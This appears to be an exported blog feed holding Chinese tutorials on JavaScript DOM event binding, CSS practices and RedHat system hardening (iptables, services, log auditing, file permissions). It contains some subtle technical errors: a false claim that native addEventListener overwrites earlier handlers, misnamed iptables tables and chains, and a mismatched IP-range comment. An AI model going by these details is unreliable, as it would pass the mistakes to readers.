    <content type="text"><![CDATA[这篇文章主要介绍了 JavaScript 中 DOM 0 级事件和 DOM 2 级事件的区别介绍DOM 0 级事件写在标签里&lt;a href=&quot;#&quot; id=&quot;main&quot; onclick=&quot;fn();fn1();&quot;&gt; &lt;button type=&quot;button&quot;&gt;this is button&lt;/button&gt; &lt;/a&gt; 如上所示,把 onclick 写在标签内,都是 DOM 0 级事件,方法 fn 和 fn1 依次执行绑定事件var ele = document.getElementById(&quot;main&quot;); ele.onclick = function() { console.log(&quot;做第一件事&quot;); }; 这也是 DOM 0 级事件方法,我们需要用 XXX.onYYY=ZZZ 这种形式来绑定事件,当点击元素时,会输出 &quot;做第一件事&quot;,恩,很理想。接下来,当我们希望在点击该元素的时候再做另一件事怎么办呢？下面这样：ele.onclick = function() { console.log(&quot;做第二件事&quot;); }; 这样肯定不行,因为我们是希望点击时既输出 “做一件事”,又要输出 “做第二件事”。而这样的话后面的方法将前面的覆盖掉了,因为 XXX.onYYY=ZZZ 只能给元素的某个事件类型(如例子中的 click 事件)绑定一个方法 ZZZ；这个问题难不到我们,既然这样,那我们就把要做的事情全都放在 ZZZ 里不就行了么；function fn1() { console.log(&quot;做第一件事&quot;); } function fn2() { console.log(&quot;做第二件事&quot;); } ele.onclick = function() { fn1(); fn2(); }; dom 2 级事件jQuery 绑定事件$(&quot;#hash&quot;).click(function() { alert(&quot;jQuery 的 DOM 2 级点击第一次&quot;); }); $(&quot;#hash&quot;).click(function() { alert(&quot;jQuery 的 DOM 2 级点击第二次&quot;); }); 通过 jQuery 方法来绑定事件,不会覆盖之前方法体里写的事件。JavaScript 绑定事件btn.addEventListener( &quot;click&quot;, function() { alert(&quot;原生 DOM 2 级第一次 click&quot;); }, false ); btn.addEventListener( &quot;click&quot;, function() { alert(&quot;原生 DOM 2 级第二次click&quot;); }, false ); 通过原生的 JavaScript 方法来绑定事件,会覆盖之前方法体里写的事件。DOM 0 级和 DOM 2 级共存&lt;a href=&quot;#&quot; id=&quot;hash&quot; onclick=&quot;fn();fn1();&quot;&gt; &lt;button type=&quot;button&quot;&gt;返回上面进行开通&lt;/button&gt; &lt;/a&gt; &lt;script type=&quot;text/javascript&quot;&gt; function fn(){ alert(&#39;ade&#39;); } function fn1(){ alert(&#39;ade111&#39;); } var btn=$(&#39;#hash&#39;).get(0); btn.onclick=function(){ alert(&#39;111&#39;); }; $(&#39;#hash&#39;).click(function(){ alert(&#39;jQuery 的 DOM 2 级点击第一次&#39;); }); btn.addEventListener(&#39;click&#39;,function(){ alert(&#39;原生 DOM 2 级第一次 click&#39;) },false); &lt;/script&gt; 上面的例子有一个两个 DOM 0 级和两个 DOM 2 级绑定事件,js 里面写的 DOM 0 级会覆盖行内的 fn 和 fn1 方法,但是 js 里面的 DOM 0 可以和 dom2 共存。]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 系统安全加固（五）：防火墙 (iptables) 的设置]]></title>
    <url>%2Farchives%2F2b51fa3c.html</url>
    <content type="text"><![CDATA[本系列笔记又是 Liunx 学习系列教程的一大步,本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记记录 RedHat 下的防火请的开启和关闭,还有允许哪些端口通过防火墙防火墙的开启和关闭永久性生效使用 chkconfig,重启后不会复原chkconfig iptables on # 开启 chkconfig iptables off # 关闭 即时生效使用 service,重启后复原service iptables start # 开启 service iptables stop # 关闭 iptables 命令解释选项解释-t\&lt;表&gt;：指定要操纵的表；-A：向规则链中添加条目；-D：从规则链中删除条目；-I：向规则链中插入条目；-R：替换规则链中的条目；-L：显示规则链中已有的条目；-F：清楚规则链中已有的条目；-Z：清空规则链中的数据包计算器和字节计数器；-N：创建新的用户自定义规则链；-P：定义规则链中的默认目标；-h：显示帮助信息；-p：指定要匹配的数据包协议类型；-s：指定要匹配的数据包源 ip 地址；-j\&lt;目标&gt;：指定要跳转的目标；-i\&lt;网络接口&gt;：指定数据包进入本机的网络接口；-o\&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。命令输入顺序iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作 表名包括raw：高级功能,如：网址过滤。mangle：数据包修改（QOS）,用于实现服务质量。net：地址转换,用于网关路由器。filter：包过滤,用于防火墙规则。规则链名包括INPUT 链：处理输入数据包。OUTPUT 链：处理输出数据包。PORWARD 链：处理转发数据包。PREROUTING 链：用于目标地址转换（DNAT）。POSTOUTING 链：用于源地址转换（SNAT）。动作包括ACCEPT：接收数据包。DROP：丢弃数据包。REDIRECT：重定向、映射、透明代理。SNAT：源地址转换。DNAT：目标地址转换。MASQUERADE：IP 伪装（NAT）,用于 ADSL。LOG：日志记录。iptables 的设置与查看查看 iptables 的设置iptables -nL service iptables status 清除已有 iptables 规则iptables -F iptables -X iptables -Z 开放指定的端口iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT # 允许本地回环接口(即运行本机访问本机) iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # 允许已建立的或相关连的通行 iptables -A OUTPUT -j ACCEPT # 允许所有本机向外的访问 iptables -A INPUT -p tcp --dport 22 -j ACCEPT # 允许访问 22 端口 iptables -A INPUT -p tcp --dport 80 -j ACCEPT # 允许访问 80 端口 iptables -A INPUT -p tcp --dport 21 -j ACCEPT # 允许 FTP 服务的 21 端口 iptables -A INPUT -p tcp --dport 20 -j ACCEPT # 允许 FTP 服务的 20 端口 iptables -A INPUT -j reject # 禁止其他未允许的规则访问 iptables -A FORWARD -j REJECT # 禁止其他未允许的规则访问 -A 是在 iptables 的最后添加一条规则,-I 是在 iptables 的前面添加一条规则屏蔽 IPiptables -I INPUT -s 123.45.6.7 -j DROP # 屏蔽单个 IP 的命令 iptables -I INPUT -s 123.0.0.0/8 -j DROP # 封整个段即从 123.0.0.1 到 123.255.255.254 的命令 iptables -I INPUT -s 124.45.0.0/16 -j DROP # 封 IP 段即从 123.45.0.1 到 123.45.255.254 的命令 iptables -I INPUT -s 123.45.6.0/24 -j DROP # 封 IP 段即从 123.45.6.1 到 123.45.6.254 的命令 保存当前设置的规则/etc/rc.d/init.d/iptables save]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编写 CSS 代码的一些建议]]></title>
    <url>%2Farchives%2Fc6e1afac.html</url>
    <content type="text"><![CDATA[想要写出高质量的 CSS 代码。那么这篇记录将大大提升你撰写 CSS 代码的效率明白何谓 Margin Collapse不同于其他很多属性。盒模型中垂直方向上的 Margin 会在相遇时发生崩塌。也就是说当某个元素的底部 Margin 与另一个元素的顶部 Margin 相邻时。只有二者中的较大值会被保留下来。For Example:.square { width: 80px; height: 80px; } .red { background-color: #f44336; margin-bottom: 40px; } .blue { background-color: #2196f3; margin-top: 30px; } 在上述例子中我们会发现。红色和蓝色方块的外边距并没有相加得到 70px。而是只有红色的下外边距保留了下来。我们可以使用一些方法来避免这种行为。不过建议来说还是尽量统一使用 margin-bottom 属性。这样就显得和谐多了。使用 Flexbox 进行布局在传统的布局中我们习惯使用 Floats 或者 inline-blocks。不过它们更适合于格式化文档。而不是整个网站。而 Flexbox 则是专门的用于进行布局的工具。Flexbox 模型允许开发者使用很多便捷可扩展的属性来进行布局。For Example:.container { display: flex; display: -webkit-flex; } 由于之前在本博客里详细介绍过 Flexbox 的布局方式,所以这里就不再重复,童鞋们可自行在本博客中搜索。使用 CSS Reset虽然这些年来随着浏览器的迅速发展与规范的统一,浏览器特性碎片化的情况有所改善,但是在不同的浏览器之间仍然存在着很多的行为差异。而解决这种问题的最好的办法就是使用某个 CSS Reset 来为所有的元素设置统一的样式,保证你能在相对统一干净的样式表的基础上开始工作。目前流行的 Reset 库有 normalize.css, minireset 以及 ress ,它们都可以修正很多已知的浏览器之间的差异性。而如果你不打算用某个外在的库,那么建议可以使用如下的基本规则：* { margin: 0; padding: 0; box-sizing: border-box; } 上面的规则看起来没啥用,不过如果不同的浏览器在默认情况下为你设置了不同的 外边距/内边距 的默认值,还是会挺麻烦的。一切应为 Border-box虽然很多初学者并不了解 box-sizing 这个属性,但是它确实相当的重要。而最好的理解它的方式就是看看它的两种取值：默认值为 content-box,即当我们设置某个元素的 heght/width 属性时,仅仅会作用于其内容尺寸。而所有的内边距与边都是在其之上的累加,譬如某个 &lt;div&gt; 标签设置为宽 100,内边距为 10,那么最终元素会占用 120(100 + 2*10) 的像素。border-box：内边距与边是包含在了 width/height 之内,譬如设置了 width:100px 的 &lt;div&gt; 无论其内边距或者边长设置为多少,其占有的大小都是 100px。将元素设置为 border-box 会很方便你进行样式布局,这样的话你就可以在父元素设置高宽限制而不担心子元素的内边距或者边打破了这种限制。以背景图方式使用 Images如果需要在响应式的环境下展示图片,有个简单的小技巧就是使用该图片作为某个 &lt;div&gt; 的背景图而不是直接使用 img 标签。基于这种方式配合上 background-size 与 background-position 这两个属性,可以很方便地按比例缩放:img { width: 300px; height: 200px; } div { width: 300px; height: 200px; background: url(&quot;//cdn.tutorialzine.com/wp-content/uploads/2016/08/bicycle.jpg&quot;); background-position: center center; background-size: cover; } section { float: left; margin: 15px; } 不过这种方式也是存在缺陷的,譬如你无法设置图片的懒加载、图片无法被搜索引擎或者其他类似的工具抓取到,有个不错的属性叫 object-fit 可以解决这个问题,不过该属性目前的浏览器支持并不是很完善。Better Table BordersHTML 中使用 Tables 进行布局一直是个很头疼的问题,它们使用起来很简单,但是无法进行响应式操作,并且也不方便进行全局样式设置。譬如,如果你打算为 Table 的边与单元的边添加样式,可能得到的结果如下:table { width: 600px; border: 1px solid #505050; margin-bottom: 15px; color: #505050; } td { border: 1px solid #505050; padding: 10px; } 这里存在的问题是出现了很多的重复的边,会导致视觉上不协调的情况,那么我们可以通过设置 border-collapse:collapse 来进行处理:注释格式优化CSS 虽然谈不上一门编程语言但是其仍然需要添加注释以保障整体代码的可读性,只要添加些简单的注释不仅可以方便你更好地组织整个样式表还能够让你的同事或者未来的自己更好地理解。对于 CSS 中整块的注释或者使用在 Media-Query 中的注释,建议是使用如下形式：/*--------------- #Header ---------------*/ header { } header nav { } /*--------------- #Slideshow ---------------*/ .slideshow { } 而设计的细节说明或者一些不重要的组件可以用如下单行注释的方式：/* Footer Buttons */ .footer button { } .footer button:hover { } 同时,不要忘了 CSS 中是没有 // 这种注释方式的：/* Do */ p { padding: 15px; /*border: 1px solid #222;*/ } /* Don&#39;t */ p { padding: 15px; // border: 1px solid #222;/* 错误的注释 */ } 使用 Kebab-case 命名变量对于样式类名或者 ID 名的命名都需要在多个单词之间添加 - 符号,CSS 本身是大小写不敏感的因此你是用不了 camelCase 的,另一方面,很久之前也不支持下划线,所以现在的默认的命名方式就是使用 - :/* Do */ .footer-column-left { } /* Don&#39;t */ .footerColumnLeft { } .footer_column_left { } 而涉及到具体的变量命名规范时,建议是使用 BEM 规范,只要遵循一些简单的原则即可以保证基于组件风格的命名一致性。你也可以参考 CSS Tricks 来获得更多的细节描述。避免重复代码大部分元素的 CSS 属性都是从 DOM 树根部继承而来,这也是其命名为级联样式表的由来。我们以 font 属性为例,该属性往往是继承自父属性,因此我们并不需要再单独地为元素设置该属性。我们只需要在 html 或者 body 中添加该属性然后使其层次传递下去即可：html { font: normal 16px/1.4 sans-serif; } 使用 transform 添加 CSS Animations不建议直接改变元素的 width 与 height 属性或者 left/top/bottom/right 这些属性来达到动画效果,而应该优先使用 transform() 属性来提供更平滑的变换效果,并且能使得代码的可读性会更好：.ball { left: 50px; transition: 0.4s ease-out; } /* Not Cool*/ .ball.slide-out { left: 500px; } /* Cool*/ .ball.slide-out { transform: translateX(450px); } Transform 的几个属性 translate、rotate 、scale 都具有比较好的浏览器兼容性可以放心使用。不要重复造轮子现在 CSS 社区已经非常庞大,并且不断地有新的各式各样的库开源出来。这些库可以帮助我们解决从小的代码片到用于构建完整的响应式应用的全框架。所以如果下次你再碰到什么 CSS 问题的时候,在打算撸起袖子自己上之前可以尝试在 GitHub 或者 CodePen 上搜索可行方案。尽可能使用低优先级的选择器并不是所有的 CSS 选择器的优先级都一样,很多初学者在使用 CSS 选择器的时候都是考虑以新的特性去复写全部的继承特性,不过这一点在某个元素多状态时就麻烦了。譬如下面这个例子：a { color: #fff; padding: 15px; } a#blue-btn { background-color: blue; } a.active { background-color: red; } 我们本来希望将 .active 类添加到按钮上然后使其显示为红色,不过在上面这个例子中很明显起不了作用,因为 button 已经以 ID 选择器设置过了背景色,也就是所谓的 Higher Selector Specificity。一般来说,选择器的优先级顺序为：ID(#id) &gt; Class(.class) &gt; Type(header)避免使用 !important认真的说,千万要避免使用 !important,这可能会导致你在未来的开发中无尽的属性重写,你应该选择更合适的 CSS 选择器。而唯一的可以使用 !important 属性的场景就是当你想去复写某些行内样式的时候,不过行内样式本身也是需要避免的。使用 text-transform 属性设置文本大写&lt;div class=&quot;movie-poster&quot;&gt;Star Wars: The Force Awakens&lt;/div&gt; .movie-poster { text-transform: uppercase; } Em, Rem, 以及 Pixel已经有很多关于人们应该如何使用 em,rem,以及 px 作为元素尺寸与文本尺寸的讨论,而笔者认为,这三个尺寸单位都有其适用与不适用的地方。不同的开发与项目都有其特定的设置,因此并没有通用的规则来决定应该使用哪个单位,这里是我总结的几个考虑:em —————————— 其基本单位即为当前元素的 font-size 值,经常适用于 media-queries 中,em 是特别适用于响应式开发中。rem —————————— 其是相对于 html 属性的单位,可以保证文本段落真正的响应式尺寸特性。px —————————— Pixels 并没有任何的动态扩展性,它们往往用于描述绝对单位,并且可以在设置值与最终的显示效果之间保留一定的一致性。在大型项目中使用预处理器估计你肯定听说过 Sass , Less , PostCSS , Stylus 这些预处理器与对应的语法。Preprocessors 可以允许我们将未来的 CSS 特性应用在当前的代码开发中,譬如变量支持、函数、嵌套式的选择器以及很多其他的特性。这里我们以 Sass 为例：$accent-color: #2196f3; a { padding: 10px 15px; background-color: $accent-color; } a:hover { background-color: darken($accent-color, 10%); } 使用 Autoprefixers 来提升浏览器兼容性使用特定的浏览器前缀是 CSS 开发中常见的工作之一,不同的浏览器、不同的属性对于前缀的要求也不一样,这就使得我们无法在编码过程中记住所有的前缀规则。并且在写样式代码的时候还需要加上特定的浏览器前缀支持也是个麻烦活,幸亏现在也是有很多工具可以辅助我们进行这样的开发：Online tools —————————— AutoprefixerText editor plugins —————————— Sublime Text , AtomLibraries —————————— Autoprefixer (PostCSS)在生产环境下使用 Minified 代码为了提升页面的加载速度,在生产环境下我们应该默认使用压缩之后的资源代码。在压缩的过程中,会将所有的空白与重复剔除掉从而减少整个文件的体积大小。当然,经过压缩之后的代码毫无可读性,因此在开发阶段我们还是应该使用普通的版本。对于 CSS 的压缩有很多的现行工具:Online tools —————————— CSS Minifier (API included), CSS CompressorText editor plugins —————————— Sublime Text , AtomLibraries —————————— Minfiy (PHP), CSSO and CSSNano (PostCSS, Grunt, Gulp)选择哪个工具肯定是依赖于你自己的工作流啦~多参阅 Caniuse不同的浏览器在兼容性上差异很大,因此如果我们可以针对我们所需要适配的浏览器,在 caniuse 上我们可以查询某个特性的浏览器版本适配性,是否需要添加特定的前缀或者在某个平台上是否存在 Bug 等等。不过光光使用 caniuse 肯定是不够的,我们还需要使用些额外的服务来进行检测。Validate：校验对于 CSS 的校验可能不如 HTML 校验或者 JavaScript 校验那么重要,不过在正式发布之前用 Lint 工具校验一波你的 CSS 代码还是很有意义的。它会告诉你代码中潜在的错误,提示你一些不符合最佳实践的代码以及给你一些提升代码性能的建议。就像 Minifers 与 Autoprefixers,也有很多可用的工具：Online tools: W3 Validator , CSS LintText editor plugins: Sublime Text , Atom Libraries: stylelint (Node.js, PostCSS), css-validator (Node.js)]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>Criterion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 系统安全加固（四）：服务和进程管理]]></title>
    <url>%2Farchives%2Fa76b3915.html</url>
    <content type="text"><![CDATA[本系列笔记又是 Liunx 学习系列教程的一大步,本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统服务和进程的查看与关闭,通俗的来说进程是运行起来的程序。唯一标示进程的是进程描述符（PID）,在 linux 内核中是通过 task_struck 和 task_list 来定义和管理进程的ps 查看系统进程ps 命令用于报告当前系统的进程状态。可以搭配 kill 指令随时中断、删除不必要的程序。ps 命令是最基本同时也是非常强大的进程查看命令,使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等,总之大部分信息都是可以通过执行该命令得到的。相关选项-a —————————— 显示所有终端机下执行的程序,除了阶段作业领导者之外a —————————— 显示现行终端机下的所有程序,包括其他用户的程序-A —————————— 显示所有程序-u\&lt;用户识别码&gt; —————————— 此选项的效果和指定 &quot;-U&quot; 选项相同u —————————— 以用户为主的格式来显示程序状况-U\&lt;用户识别码&gt; —————————— 列出属于该用户的程序的状况,也可使用用户名称来指定U\&lt;用户名称&gt; —————————— 列出属于该用户的程序的状况-e —————————— 此选项的效果和指定 &quot;A&quot; 选项相同e —————————— 列出程序时,显示每个程序所使用的环境变量-f —————————— 显示 UID,PPIP,C 与 STIME 栏位f —————————— 用 ASCII 字符显示树状结构,表达程序间的相互关系示例For Example:ps aux | grep ssh netstat 查看网络情况netstat 命令用来打印 Linux 中网络系统的状态信息,可让你得知整个 Linux 系统的网络情况。相关选项-t 或 —tcp —————————— 显示 TCP 传输协议的连线状况-u 或 —udp —————————— 显示 UDP 传输协议的连线状况-n 或 —numeric —————————— 直接使用 ip 地址,而不通过域名服务器-p 或 —programs —————————— 显示正在使用 Socket 的程序识别码和程序名称-l 或 —listening —————————— 显示监控中的服务器的 Socket示例For Example:netstat -tulnp chkconfig 查看系统服务chkconfig 命令检查、设置系统的各种服务。这是 Red Hat 公司遵循 GPL 规则所开发的程序,它可查询操作系统在每一个执行等级中会执行哪些系统服务,其中包括各类常驻服务。谨记 chkconfig 不是立即自动禁止或激活一个服务,它只是简单的改变了符号连接。选项解释—add —————————— 增加所指定的系统服务,让 chkconfig 指令得以管理它,并同时在系统启动的叙述文件内增加相关数据；—del —————————— 删除所指定的系统服务,不再由 chkconfig 指令管理,并同时在系统启动的叙述文件内删除相关数据；—level\&lt;等级代号&gt; —————————— 指定读系统服务要在哪一个执行等级中开启或关毕。等级 0 表示 —————————— 表示关机等级 1 表示 —————————— 单用户模式等级 2 表示 —————————— 无网络连接的多用户命令行模式等级 3 表示 —————————— 有网络连接的多用户命令行模式等级 4 表示 —————————— 不可用等级 5 表示 —————————— 带图形界面的多用户模式等级 6 表示 —————————— 重新启动—list —————————— 列出系统服务列表示例For Example:chkconfig --list 关闭进程或服务kill 杀死进程kill 命令用来删除执行中的程序或工作。kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15),可将指定程序终止。若仍无法终止该程序,可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 job 指令查看。选项解释-a—————————— 当处理当前进程时,不限制命令名和进程号的对应关系；-l \&lt;信息编号&gt;—————————— 若不加 &lt;信息编号&gt; 选项,则 -l 参数会列出全部的信息名称；p—————————— 指定 kill 命令只打印相关进程的进程号,而不发送任何信号；-s \&lt;信息名称或编号&gt;—————————— 指定要送出的信息；-u—————————— 指定用户。 参数只有第 9 种信号(SIGKILL)才可以无条件终止进程,其他信号进程都有权利忽略,下面是常用的信号——————————HUP 1 终端断线INT 2 中断（同 Ctrl + C）QUIT 3 退出（同 Ctrl + \）TERM 15 终止KILL 9 强制终止CONT 18 继续（与 STOP 相反, fg/bg 命令）STOP 19 暂停（同 Ctrl + Z）示例用 ps 查找进程,然后用 kill 杀掉,For Examlpe:ps -ef | grep ssh kill 4456 用 netstat 查找进程,然后用 kill 杀掉,For Examlpe:netstat -tulnp | grep ssh kill 4456 service 关闭服务service 命令是 Redhat Linux 兼容的发行版中用来控制系统服务的实用工具,它以启动、停止、重新启动和关闭系统服务,还可以显示所有系统服务的当前状态。选项信息-h—————————— 显示帮助信息；—status-all—————————— 显示所服务的状态。示例For Examlpe:service mysqld status service mysqld stop 那么要是系统没有 service 命令,怎么办呢？Liunx 系统下是所有的服务名是存放在 /etc/init.d/ 下的,所以也可以使用以下命令来停止服务,For Examlpe:/etc/init.d/named status /etc/init.d/named stop chkconfig 删除服务示例For Examlpe:chkconfig --list | grep sendmail chkconfig --del sendmail]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 系统安全加固（三）：系统日志审计]]></title>
    <url>%2Farchives%2F17557f0c.html</url>
    <content type="text"><![CDATA[本系列笔记又是 Liunx 学习系列教程的一大步,本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统日志审计的配置,加强系统的防御能力syslog 登录事件记录查看参数 authpriv 值,For Exmaple:more /etc/syslog.conf | grep authpriv 表名登录事件记录在 /var/log/secure 文件中,使用以下命令检查非法记录more /var/log/secure | grep refused 审计功能的进程启动审计进程,For Exmaple:service auditd start service psacct start 启动 psacct 服务service psacct start chkconfig psacct on 查看记录审计的日志auditd 审计进程日志记录在 /var/log/audit/audit.logpsacct 日志记录在 /var/account/pacct注意：pacct 日志是二进制文件,使用以下命令进行查看For Exmaple:lastcomm -f /var/account/pacct 登录日志查看lastlog 查看用户最后一次登录时间,For Exmaple:lastlog]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 系统安全加固（二）：用户和文件权限]]></title>
    <url>%2Farchives%2F83a8114d.html</url>
    <content type="text"><![CDATA[本系列笔记又是 Liunx 学习系列教程的一大步,本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录用户和文件的权限（主要是特殊权限）,加强系统的防御能力主要的介绍Linux 文件系统的安全主要是通过设置文件的权限来实现的。每一个 Linux 的文件或目录,都有 3 组属性,分别定义文件或目录的所有者,用户组和其他人的使用权限（只读、可写、可执行、允许 SUID、允许 SGID 等）。特别注意,权限为 SUID 和 SGID 的可执行文件,在程序运行过程中,会给进程赋予所有者的权限,如果被黑客发现并利用就会给系统造成危害。查找同时存在 SUID 和 SGID 的文件使用 find 命令find / -xdev -perm -6000 举例,普通用户无法直接 vi 修改 /etc/passwd 文件,但却可以通过 passwd 命令来修改自身的密码。这时就利用了 /bin/passwd 的 SUID 的权限。如果一个程序被设置成了 S 位标志,那么普通用户就可以以 root 身份来运行这个程序。对系统安全性有较大不利影响,所以应禁止所有不必要的 SUID/SGID 程序。修改部分系统文件的 SUID 和 SGID 的权限：chmod a-s /usr/bin/chage chmod a-s /usr/bin/gpasswd chmod a-s /usr/bin/wall chmod a-s /usr/bin/chfn chmod a-s /usr/bin/chsh chmod a-s /usr/bin/newgrp chmod a-s /usr/bin/write chmod a-s /usr/sbin/usernetctl chmod a-s /bin/mount chmod a-s /bin/umount chmod a-s /sbin/netreport find 命令选项解释-perm &lt;权限数值&gt; =&gt; 查找符合指定的权限数值的文件或目录；-xdev =&gt; 将范围局限在先行的文件系统中；find -perm mode =&gt; 表示严格匹配,也就是你的文件权限位转换成对应的十进制数字与 mode 一模一样,那么匹配成功,需要注意的是如果 mode 给的数字不足 3 位,那么前面自动添 0 (严格的说是不足 4 位,原因就是前面所说的 SetUID,SetGID）find -perm -mode =&gt; 表示模糊查询,也就是说你的文件权限位转换成对应的十进制数字被 mode 包含,就会被搜索出来find -perm +mode =&gt; 与 -mode 的区别是 +mode 只需其中的任意一个 1 的部分被匹配,-mode 是所有 1 的部分都必须被匹配,同样 +mode 也不管 0 位文件的默认权限使用 umask 指定当前用户创建文件夹和文件的默认权限属性若使用者建立为文件,则预设没有可执行 ( x ) 项目,亦即只有 rw 这两个项目,也就是最大为 666,即权限为 -rw-rw-rw-若使用者建立为目录,则由于 x 与是否可以进入此目录有关,因此预设为所有权限均开放,亦即为 777,即权限为 drwxrwxrwx修改默认权限主要修改配置文件 /etc/profile、/etc/bashrc、/etc/csh.login、/etc/csh.cshrc生成目录的权限为 777-002=775,即 drwxrwxr-x生成文件的权限为 666-002=664,即 -rw-rw-r--For Exmaple:umask 002 生成目录的权限为 777-022=755,即 drwxrwxr-x生成文件的权限为 666-022=644,即 -rw-r--r--For Exmaple:umask 022 注意,不要单纯的进行数字加减比如,umask 003,如果以数字加减,则文件权限为 666-003=663,相当于 -rw-rw--wx,显然不正确,应该先转换成权限属性再相减 -rw-rw-rw- 减去 --------wx,即应该为 -rw-rw-r--影响：移动规范要求 umask 027,这样生成的文件默认权限为 -rw-r-----,只有本用户可读、写、执行。如果业务需要,其他用户也需要操作该 用户的文件,就会有问题。可以使用默认的 022环境变量的安全性root 用户环境变量的安全性主要检查 PATH 变量,For Exmaple:echo $PATH | egrep &#39;(^|:)(\.|:|$)&#39; 检查是否包含组目录权限为 o+w 的目录或者 g+w 的目录find `echo $PATH | tr &#39;:&#39; &#39; &#39;` -type d \( -perm -002 -o -perm -020 \) -ls -002 表示任何目录或文件,只要带 o+w 就匹配+002 表示目录或文件只有 o+w 权限,即 -------w-可能会出现报错提示 /root/bin 目录不存在,PATH 里有该路径,而实际上没有,可以先在 /root 下建立一个 bin 目录检查 root 用户环境变量 path 规范检查系统 root 用户环境变量 path 中是否包含 “.”,For Exmaple:env | grep PATH 修改文件 /etc/profile、/etc/bashrc 或 /root/.bash_profile 在 “PATH＝……” 这句中删除-002 表示任何目录或文件,只要带 o+w 就匹配+002 表示目录或文件只有 o+w 权限,即 -------w-可能会出现报错提示 /root/bin 目录不存在,PATH 里有该路径,而实际上没有,可以先在 /root 下建立一个 bin 目录远程连接的安全性配置主要查找系统中是否含有 .netrc 和 .rhosts 文件,如无必要,删除这两个文件,For Exmaple:find / -name .netrc find / -name .rhosts 重要目录和文件的权限设置执行以下命令检查目录和文件的权限设置情况ls -l /etc/ ls -l /etc/rc.d/init.d/ ls -l /tmp ls -l /etc/inetd.conf ls -l /etc/passwd ls -l /etc/shadow ls -l /etc/group ls -l /etc/security ls -l /etc/services ls -l /etc/rc*.d 对于重要目录,建议执行如下类似操作,For Exmaple:chmod -R 750 /etc/rc.d/init.d/* 这样只有 root 可以读、写和执行,编写脚本一次性执行,For Exmaple:chmod 644 /etc/passwd chmod 600 /etc/shadow chmod 644 /etc/group chmod 600 /etc/gshadow chmod 700 /bin/rpm chmod 644 /usr/bin/xhost chmod 664 /etc/hosts chmod 644 /etc/exports chmod 644 /etc/issue chmod 664 /var/log/wtmp chmod 644 /etc/services chmod 600 /etc/xinetd.conf chmod 600 /etc/login.defs chmod 600 /etc/hosts.allow chmod 600 /etc/hosts.deny chmod 600 /etc/securetty chmod 600 /etc/ssh/ssh_host_key chmod 600 /etc/ssh/sshd_config chmod 600 /var/log/lastlog chmod 600 /var/log/messages chmod 600 /etc/security 影响： 有的移动安全加固标准要求/etc 目录是 750 权限,但如果/etc 目录是权限是 750（drwxr-x—-）的话,由于其他组没有 x 权限,那么普通用户就无权访问/etc 目录以及以下所有文件,用户获取不到基本的环境变量/etc/profile 和/etc/passwd、group 等文件,一些基本命令都会出现问题,本用户的文件只有 uid、gid,无法对应名用户名称和组名称。检查任何人都有写权限的目录For Exmaple:find / -type d -perm -0222 -exec ls -ldg {} \; 这些目录是存放每个用户临时文件的,目录本身是带 Sticky BIT 粘滞位的,即使里面的文件有 o+w 权限也没问题,系统本身有保护性措施。查找任何人都有写权限的文件For Exmaple:find / -type f -perm -0222 -exec ls -lg {} \; 检查没有属主的文件For Exmaple:find / -nouser -o -nogroup -print 发现没有属主的文件往往就意味着有黑客入侵你的系统了。不能允许没有主 人的文件存在。如果在系统中发现了没有属主的文件或目录,先查看它的完 整性,如果一切正常,给它一个属主。有时候卸载程序可能会出现一些没有 主人的文件或目录,在这种情况下可以把这些文件和目录删除掉。在安全加固脚本中,把没有属主或属组的文件直接赋予了 nobody 用户和组,For Exmaple:find / -path &quot;/proc&quot; -prune -nouser -o -nogroup -exec chown nobody:nobody {} \; 说明：命令中排除了 /proc 目录检查异常隐含文件For Exmaple:find / -xdev -name &quot;..*&quot; -print find / -xdev -name &quot;...*&quot; -print find / -xdev -name &quot;..^G&quot; -print 同时也要注意象 “.xx” 和 “.mail” 这样的文件名的。（这些文件名看起来都很象正常的文件名）在系统的每个地方都要查看一下有没有异常隐含文件（点号是起始字符的,用 “ls” 命令看不到的文件）,因为这些文件可能是隐藏的黑客工具或者其它一些信息（口令破解程序、其它系统的口令文件,等等）。在 UNIX 下,一个常用的技术就是用一些特殊的名,如：“...”、“.. ”（点点空格）或 “..^G”（点点 ctrl+v 和 ctrl+G）,来隐含文件或目录。基本上系统默认只有一个文件 /usr/share/man/man1/..1.gz ,在加固脚本中的处理方式是存在就直接把它删除掉。加锁重要口令文件和组文件可以用下面的命令给口令文件和组文件设置不可改变位加锁,For Exmaple:chattr +i /etc/passwd chattr +i /etc/shadow chattr +i /etc/group chattr +i /etc/gshadow chattr +i /etc/xinetd.conf chattr +i /etc/services 加锁后,就不能被改变文件内容。同时会影响 useradd、userdel 等跟帐户相关的操作查看命令,For Exmaple:lsattr /etc/passwd 返回结果为：----i-------- /etc/passwd如果要修改文件,必须先对该文件进行解锁,For Exmaple:chattr -i /etc/passwd chattr -i /etc/shadow chattr -i 